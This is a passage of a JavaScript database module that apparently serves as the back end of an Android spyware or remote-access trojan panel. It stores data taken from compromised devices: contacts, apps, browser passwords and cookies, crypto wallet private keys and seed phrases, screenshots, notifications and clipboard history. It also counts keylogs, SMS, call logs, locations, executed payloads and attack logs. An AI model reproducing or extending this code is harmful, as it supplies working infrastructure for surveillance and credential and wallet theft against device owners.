            INSERT INTO contacts (session_id, contact_name, phone_numbers, emails, organization, job_title, photo_path, starred)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, contactName, JSON.stringify(phoneNumbers), JSON.stringify(emails), organization, jobTitle, photoPath, starred ? 1 : 0);
        await stmt.finalize();
    }
    
    async addContactsBatch(sessionId, contacts) {
        const stmt = await this.db.prepare(`
            INSERT INTO contacts (session_id, contact_name, phone_numbers, emails, organization, job_title)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        
        for (const contact of contacts) {
            await stmt.run(sessionId, contact.name, JSON.stringify(contact.phones), JSON.stringify(contact.emails), contact.org, contact.job);
        }
        await stmt.finalize();
    }
    
    async getContacts(sessionId, limit = 1000) {
        return await this.db.all(`
            SELECT * FROM contacts 
            WHERE session_id = ? 
            ORDER BY contact_name ASC LIMIT ?
        `, sessionId, limit);
    }
    
    async searchContacts(sessionId, searchTerm) {
        return await this.db.all(`
            SELECT * FROM contacts 
            WHERE session_id = ? AND (contact_name LIKE ? OR phone_numbers LIKE ?)
            ORDER BY contact_name ASC
        `, sessionId, `%${searchTerm}%`, `%${searchTerm}%`);
    }
    
    async getContactCount(sessionId) {
        const result = await this.db.get('SELECT COUNT(*) as count FROM contacts WHERE session_id = ?', sessionId);
        return result.count;
    }
    
    // ==================== APP METHODS ====================
    
    async addInstalledApp(sessionId, appName, packageName, version, versionCode, installDate, updateDate, size, isSystem, permissions, activities, services) {
        const stmt = await this.db.prepare(`
            INSERT OR REPLACE INTO installed_apps 
            (session_id, app_name, package_name, version, version_code, install_date, update_date, size, is_system, permissions, activities, services)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, appName, packageName, version, versionCode, installDate, updateDate, size, isSystem ? 1 : 0, JSON.stringify(permissions), JSON.stringify(activities), JSON.stringify(services));
        await stmt.finalize();
    }
    
    async addAppsBatch(sessionId, apps) {
        const stmt = await this.db.prepare(`
            INSERT OR REPLACE INTO installed_apps 
            (session_id, app_name, package_name, version, version_code, size, is_system)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        
        for (const app of apps) {
            await stmt.run(sessionId, app.name, app.package, app.version, app.versionCode, app.size, app.isSystem ? 1 : 0);
        }
        await stmt.finalize();
    }
    
    async getInstalledApps(sessionId, limit = 500) {
        return await this.db.all(`
            SELECT * FROM installed_apps 
            WHERE session_id = ? 
            ORDER BY app_name ASC LIMIT ?
        `, sessionId, limit);
    }
    
    async getSystemApps(sessionId) {
        return await this.db.all(`
            SELECT * FROM installed_apps 
            WHERE session_id = ? AND is_system = 1 
            ORDER BY app_name ASC
        `, sessionId);
    }
    
    async getUserApps(sessionId) {
        return await this.db.all(`
            SELECT * FROM installed_apps 
            WHERE session_id = ? AND is_system = 0 
            ORDER BY app_name ASC
        `, sessionId);
    }
    
    async getAppByPackage(sessionId, packageName) {
        return await this.db.get(`
            SELECT * FROM installed_apps 
            WHERE session_id = ? AND package_name = ?
        `, sessionId, packageName);
    }
    
    // ==================== BROWSER DATA METHODS ====================
    
    async addBrowserData(sessionId, browserType, dataType, dataContent, url = null, title = null, timestamp = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO browser_data (session_id, browser_type, data_type, data_content, url, title, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, browserType, dataType, dataContent, url, title, timestamp || new Date().toISOString());
        await stmt.finalize();
    }
    
    async getBrowserHistory(sessionId, browserType = null, limit = 500) {
        let query = 'SELECT * FROM browser_data WHERE session_id = ? AND data_type = "history"';
        const params = [sessionId];
        
        if (browserType) {
            query += ' AND browser_type = ?';
            params.push(browserType);
        }
        
        query += ' ORDER BY timestamp DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    async getBrowserPasswords(sessionId) {
        return await this.db.all(`
            SELECT * FROM browser_data 
            WHERE session_id = ? AND data_type = "password"
            ORDER BY timestamp DESC
        `, sessionId);
    }
    
    async getBrowserCookies(sessionId) {
        return await this.db.all(`
            SELECT * FROM browser_data 
            WHERE session_id = ? AND data_type = "cookie"
            ORDER BY timestamp DESC
        `, sessionId);
    }
    
    // ==================== CRYPTO WALLET METHODS ====================
    
    async addCryptoWallet(sessionId, walletType, walletAddress, privateKey = null, publicKey = null, seedPhrase = null, balance = 0, currency = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO crypto_wallets (session_id, wallet_type, wallet_address, private_key, public_key, seed_phrase, balance, currency, last_updated)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `);
        await stmt.run(sessionId, walletType, walletAddress, privateKey, publicKey, seedPhrase, balance, currency);
        await stmt.finalize();
    }
    
    async getCryptoWallets(sessionId) {
        return await this.db.all(`
            SELECT * FROM crypto_wallets 
            WHERE session_id = ? 
            ORDER BY balance DESC
        `, sessionId);
    }
    
    async updateWalletBalance(walletId, balance) {
        await this.db.run(`
            UPDATE crypto_wallets 
            SET balance = ?, last_updated = CURRENT_TIMESTAMP 
            WHERE id = ?
        `, balance, walletId);
    }
    
    // ==================== SCREENSHOT METHODS ====================
    
    async addScreenshot(sessionId, screenshotPath, thumbnailPath, width, height, size) {
        const stmt = await this.db.prepare(`
            INSERT INTO screenshots (session_id, screenshot_path, thumbnail_path, width, height, size)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, screenshotPath, thumbnailPath, width, height, size);
        await stmt.finalize();
    }
    
    async getScreenshots(sessionId, limit = 100) {
        return await this.db.all(`
            SELECT * FROM screenshots 
            WHERE session_id = ? 
            ORDER BY captured_at DESC LIMIT ?
        `, sessionId, limit);
    }
    
    // ==================== NOTIFICATION METHODS ====================
    
    async addNotification(sessionId, notificationText, notificationType, appName, packageName, timestamp) {
        const stmt = await this.db.prepare(`
            INSERT INTO notifications (session_id, notification_text, notification_type, app_name, package_name, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, notificationText, notificationType, appName, packageName, timestamp);
        await stmt.finalize();
    }
    
    async getNotifications(sessionId, limit = 500) {
        return await this.db.all(`
            SELECT * FROM notifications 
            WHERE session_id = ? 
            ORDER BY timestamp DESC LIMIT ?
        `, sessionId, limit);
    }
    
    // ==================== CLIPBOARD METHODS ====================
    
    async addClipboardData(sessionId, content, contentType, source = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO clipboard_history (session_id, content, content_type, source)
            VALUES (?, ?, ?, ?)
        `);
        await stmt.run(sessionId, content, contentType, source);
        await stmt.finalize();
    }
    
    async getClipboardHistory(sessionId, limit = 100) {
        return await this.db.all(`
            SELECT * FROM clipboard_history 
            WHERE session_id = ? 
            ORDER BY timestamp DESC LIMIT ?
        `, sessionId, limit);
    }
    
    // ==================== ATTACK LOG METHODS ====================
    
    async addAttackLog(sessionId, attackType, target, port = null, status = 'started') {
        const stmt = await this.db.prepare(`
            INSERT INTO attack_logs (session_id, attack_type, target, port, status, started_at)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `);
        await stmt.run(sessionId, attackType, target, port, status);
        await stmt.finalize();
        
        const result = await this.db.get('SELECT last_insert_rowid() as id');
        return result.id;
    }
    
    async updateAttackLog(attackId, status, result = null, packetsSent = null, duration = null) {
        await this.db.run(`
            UPDATE attack_logs 
            SET status = ?, result = ?, packets_sent = ?, duration = ?, ended_at = CURRENT_TIMESTAMP 
            WHERE id = ?
        `, status, result, packetsSent, duration, attackId);
    }
    
    async getAttackLogs(sessionId, limit = 100) {
        return await this.db.all(`
            SELECT * FROM attack_logs 
            WHERE session_id = ? 
            ORDER BY started_at DESC LIMIT ?
        `, sessionId, limit);
    }
    
    // ==================== SYSTEM LOG METHODS ====================
    
    async addSystemLog(logLevel, message, source, metadata = null, userId = null, sessionId = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO system_logs (log_level, message, source, user_id, session_id, metadata)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(logLevel, message, source, userId, sessionId, metadata ? JSON.stringify(metadata) : null);
        await stmt.finalize();
    }
    
    async getSystemLogs(limit = 500, level = null, startDate = null, endDate = null) {
        let query = 'SELECT * FROM system_logs';
        const params = [];
        const conditions = [];
        
        if (level) {
            conditions.push('log_level = ?');
            params.push(level);
        }
        if (startDate) {
            conditions.push('timestamp >= ?');
            params.push(startDate);
        }
        if (endDate) {
            conditions.push('timestamp <= ?');
            params.push(endDate);
        }
        
        if (conditions.length > 0) {
            query += ' WHERE ' + conditions.join(' AND ');
        }
        
        query += ' ORDER BY timestamp DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    // ==================== ALERT METHODS ====================
    
    async addAlert(alertType, severity, message, sessionId = null, metadata = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO alerts (alert_type, severity, message, session_id, metadata)
            VALUES (?, ?, ?, ?, ?)
        `);
        await stmt.run(alertType, severity, message, sessionId, metadata ? JSON.stringify(metadata) : null);
        await stmt.finalize();
        
        return await this.db.get('SELECT last_insert_rowid() as id');
    }
    
    async getAlerts(limit = 100, severity = null, unreadOnly = false) {
        let query = 'SELECT * FROM alerts';
        const params = [];
        const conditions = [];
        
        if (severity) {
            conditions.push('severity = ?');
            params.push(severity);
        }
        if (unreadOnly) {
            conditions.push('is_read = 0');
        }
        
        if (conditions.length > 0) {
            query += ' WHERE ' + conditions.join(' AND ');
        }
        
        query += ' ORDER BY created_at DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    async markAlertRead(alertId) {
        await this.db.run(`
            UPDATE alerts 
            SET is_read = 1, read_at = CURRENT_TIMESTAMP 
            WHERE id = ?
        `, alertId);
    }
    
    async markAllAlertsRead() {
        await this.db.run('UPDATE alerts SET is_read = 1, read_at = CURRENT_TIMESTAMP WHERE is_read = 0');
    }
    
    // ==================== BACKUP METHODS ====================
    
    async createBackup(sessionId, backupType, backupPath, backupSize, fileCount) {
        const backupId = crypto.randomBytes(16).toString('hex');
        const stmt = await this.db.prepare(`
            INSERT INTO backups (backup_id, session_id, backup_type, backup_path, backup_size, file_count)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(backupId, sessionId, backupType, backupPath, backupSize, fileCount);
        await stmt.finalize();
        return backupId;
    }
    
    async getBackups(sessionId = null, limit = 50) {
        let query = 'SELECT * FROM backups';
        const params = [];
        
        if (sessionId) {
            query += ' WHERE session_id = ?';
            params.push(sessionId);
        }
        
        query += ' ORDER BY created_at DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    async restoreBackup(backupId, restoredBy) {
        await this.db.run(`
            UPDATE backups 
            SET restored_at = CURRENT_TIMESTAMP, restored_by = ? 
            WHERE backup_id = ?
        `, restoredBy, backupId);
    }
    
    // ==================== SETTINGS METHODS ====================
    
    async getSetting(key) {
        const result = await this.db.get('SELECT setting_value FROM settings WHERE setting_key = ?', key);
        return result ? result.setting_value : null;
    }
    
    async setSetting(key, value, type = 'string', description = null, updatedBy = null) {
        await this.db.run(`
            INSERT OR REPLACE INTO settings (setting_key, setting_value, setting_type, description, updated_at, updated_by)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, ?)
        `, key, value, type, description, updatedBy);
    }
    
    async getAllSettings() {
        return await this.db.all('SELECT * FROM settings ORDER BY setting_key ASC');
    }
    
    // ==================== STATISTICS METHODS ====================
    
    async getSystemStats() {
        const stats = {};
        
        stats.totalSessions = await this.db.get('SELECT COUNT(*) as count FROM sessions');
        stats.activeSessions = await this.db.get('SELECT COUNT(*) as count FROM sessions WHERE status = "active"');
        stats.totalCommands = await this.db.get('SELECT COUNT(*) as count FROM commands');
        stats.executedCommands = await this.db.get('SELECT COUNT(*) as count FROM commands WHERE status = "executed"');
        stats.totalKeylogs = await this.db.get('SELECT COUNT(*) as count FROM keylogs');
        stats.totalLocations = await this.db.get('SELECT COUNT(*) as count FROM location_history');
        stats.totalSMS = await this.db.get('SELECT COUNT(*) as count FROM sms_messages');
        stats.totalCalls = await this.db.get('SELECT COUNT(*) as count FROM call_logs');
        stats.totalContacts = await this.db.get('SELECT COUNT(*) as count FROM contacts');
        stats.totalApps = await this.db.get('SELECT COUNT(*) as count FROM installed_apps');
        stats.totalPayloads = await this.db.get('SELECT COUNT(*) as count FROM payloads');
        stats.executedPayloads = await this.db.get('SELECT COUNT(*) as count FROM payloads WHERE executed = 1');
        stats.totalScreenshots = await this.db.get('SELECT COUNT(*) as count FROM screenshots');
        stats.totalBrowserData = await this.db.get('SELECT COUNT(*) as count FROM browser_data');
        stats.totalCryptoWallets = await this.db.get('SELECT COUNT(*) as count FROM crypto_wallets');
        stats.totalAlerts = await this.db.get('SELECT COUNT(*) as count FROM alerts');
        stats.unreadAlerts = await this.db.get('SELECT COUNT(*) as count FROM alerts WHERE is_read = 0');
        
        // Database size
        const dbStats = await fs.stat(config.paths.database);
        stats.databaseSize = dbStats.size;
        
        return stats;
    }
    
    async getSessionStats(sessionId) {
        return await this.db.get(`
            SELECT 
                s.device_name,
                s.device_model,
                s.android_version,
                s.battery,
                s.is_rooted,
                s.first_seen,
                s.last_seen,
                (SELECT COUNT(*) FROM commands WHERE session_id = s.session_id) as command_count,
                (SELECT COUNT(*) FROM keylogs WHERE session_id = s.session_id) as keylog_count,
                (SELECT COUNT(*) FROM location_history WHERE session_id = s.session_id) as location_count,
                (SELECT COUNT(*) FROM sms_messages WHERE session_id = s.session_id) as sms_count,
                (SELECT COUNT(*) FROM call_logs WHERE session_id = s.session_id) as call_count,
                (SELECT COUNT(*) FROM contacts WHERE session_id = s.session_id) as contact_count,
                (SELECT COUNT(*) FROM installed_apps WHERE session_id = s.session_id) as app_count
            FROM sessions s
            WHERE s.session_id = ?
        `, sessionId);
    }
    
    // ==================== CLEANUP METHODS ====================
    
    async cleanupOldData(daysToKeep = 30) {
        const cutoffDate = new Date();
        cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
        const cutoff = cutoffDate.toISOString();
        
        const results = {};
        
        // Clean old keylogs
        const keylogResult = await this.db.run('DELETE FROM keylogs WHERE timestamp < ?', cutoff);
        results.keylogs = keylogResult.changes;
        
        // Clean old location history
        const locationResult = await this.db.run('DELETE FROM location_history WHERE captured_at < ?', cutoff);
        results.locations = locationResult.changes;
        
        // Clean old system logs
        const logResult = await this.db.run('DELETE FROM system_logs WHERE timestamp < ?', cutoff);
        results.systemLogs = logResult.changes;
        
        // Clean old attack logs
        const attackResult = await this.db.run('DELETE FROM attack_logs WHERE started_at < ?', cutoff);
        results.attackLogs = attackResult.changes;
        
        // Clean expired payloads
        const payloadResult = await this.db.run(`
            DELETE FROM payloads 
            WHERE expires_at < ? AND status IN ('generated', 'pending', 'expired')
        `, new Date().toISOString());
        results.payloads = payloadResult.changes;
        
        return results;
    }
    
    async vacuum() {
        await this.db.run('VACUUM');
    }
    
    // ==================== EXPORT/IMPORT ====================
    
    async exportDatabase(exportPath) {
        await fs.copy(config.paths.database, exportPath);
        return exportPath;
    }
    
    async getDatabaseInfo() {
        const stats = await fs.stat(config.paths.database);
        const tables = await this.db.all(`
            SELECT name, sql FROM sqlite_master 
            WHERE type='table' AND name NOT LIKE 'sqlite_%'
        `);
        
        const tableCounts = {};
        for (const table of tables) {
            const count = await this.db.get(`SELECT COUNT(*) as count FROM ${table.name}`);
            tableCounts[table.name] = count.count;
        }
        
        return {
            size: stats.size,
            tables: tableCounts,
            lastModified: stats.mtime
        };
    }
    
    // ==================== CLOSE DATABASE ====================
    
    async close() {
        if (this.db) {
            await this.db.close();
            console.log('📁 Database closed');
        }
    }
}

module.exports = new Database();
